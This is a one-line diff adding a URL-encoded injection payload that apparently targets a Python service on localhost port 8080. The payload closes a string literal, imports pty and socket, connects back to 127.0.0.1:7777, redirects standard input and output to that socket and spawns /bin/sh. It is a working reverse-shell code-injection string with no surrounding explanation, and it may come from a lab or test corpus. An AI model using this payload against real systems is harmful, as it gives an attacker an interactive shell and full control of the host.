@@ -1,0 +1,1 @@
+http://127.0.0.1:8080/';%20import%20pty%20;info=socket.socket();%20info.connect((%22127.0.0.1%22,7777));os.dup2(info.fileno(),0);os.dup2(info.fileno(),1);os.dup2(info.fileno(),2);%20pty.spawn(%22/bin/sh%22);%20b='
